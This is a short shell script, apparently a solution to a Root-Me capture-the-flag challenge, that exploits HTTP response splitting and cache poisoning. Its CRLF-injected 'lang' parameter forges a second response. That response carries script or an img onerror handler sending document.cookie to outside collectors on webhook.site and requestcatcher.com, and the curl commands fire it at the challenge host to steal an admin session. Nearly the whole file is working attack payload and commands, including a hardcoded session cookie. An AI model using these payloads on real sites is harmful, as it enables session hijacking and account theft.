#! /bin/sh
link="home"
payload="%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLocation:%20/$link%20%0d%0aLast-Modified:%20Mon,%2027%20Oct%202025%2014:50:18%20GMT%0d%0aContent-Length:%20128%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>document.location='https://webhook.site/5c570631-54ae-486f-ba41-819eb5a4928d?c='%2Bdocument.cookie</script></html>"
payload2="%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aPragma:%20no-cache%0d%0aLocation:%20/$link%20%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%200"
ses="user_session=fcee6bb8-4422-4ad8-b6d9-6c9090c5d3c6"
link="admin"

payload="%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202025%2014:50:18%20GMT%0d%0aContent-Length:%20117%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dthis.src%3D%27http%3A%2F%2Fjojo.requestcatcher.com%2Ftest%3Fc%3D%27%2Bdocument.cookie%3E"
curl -v -H 'Cache-Control: no-cache' --cookie "lang=en;$ses" "http://challenge01.root-me.org:58002/admin"
curl --cookie "lang=en;$ses" "http://challenge01.root-me.org:58002/user/param?lang=en$payload"
curl -i --cookie "lang=en;$ses" "http://challenge01.root-me.org:58002/admin"
# curl -v -H 'Cache-Control: no-cache' --cookie "lang=en;$ses" "http://challenge01.root-me.org:58002/home"

# curl -v -H 'Cache-Control: no-cache' --cookie "lang=en;user_session=$ses" "http://challenge01.root-me.org:58002/admin"
# curl -v -L --cookie "lang=en;$ses" "http://challenge01.root-me.org:58002/user/param?lang=en$payload2"
# curl -v -L --cookie "lang=en;$ses" "http://challenge01.root-me.org:58002/user/param?lang=en$payload"
# curl -v --cookie "lang=en;$ses" "http://challenge01.root-me.org:58002/$link"
# curl  -H "Cache-Control: no-cache" http://challenge01.root-me.org:58002/admin
# curl   'http://challenge01.root-me.org:58002/user/param?lang=fr%3B%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A0%0A%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Length%3A%201%0AContent-Type%3A%20text%2Fhtml%3B%0A%0A%3Chtml%3E%3Chead%3E%3C%2Fhead%3E%3Cbody%3E%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fwebhook.site%2F5c570631-54ae-486f-ba41-819eb5a4928d%3Fc%3D%22%2Bdocument.cookie%3C%2Fscript%3E%3C%2Fbody%3E%3C%2Fhtml%3E%0A'
